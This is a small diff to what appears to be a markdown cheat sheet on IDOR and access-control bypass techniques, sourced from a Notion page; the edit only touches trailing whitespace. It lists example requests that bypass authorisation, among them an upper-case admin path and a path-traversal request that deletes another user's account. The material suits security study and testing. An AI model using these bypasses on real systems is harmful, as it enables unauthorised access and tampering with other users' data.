@@ -63,9 +63,9 @@ GET /graphql.php?query= --> 200 OK
 GET /admin/profile --> 401 Unauthorized
 GET /ADMIN/profile --> 200 OK
 ```
-## 10. Path Traversal:
+## 10. Path Traversal: 
     POST /users/delete/VICTIM_ID --> 403 Forbidden
-    POST /users/delete/MY_ID/../VICTIM_ID --> 200 OK
+    POST /users/delete/MY_ID/../VICTIM_ID --> 200 OK 
 
 
 Source: https://www.notion.so/IDOR-Attack-vectors-exploitation-bypasses-and-chains-0b73eb18e9b640ce8c337af83f397a6b
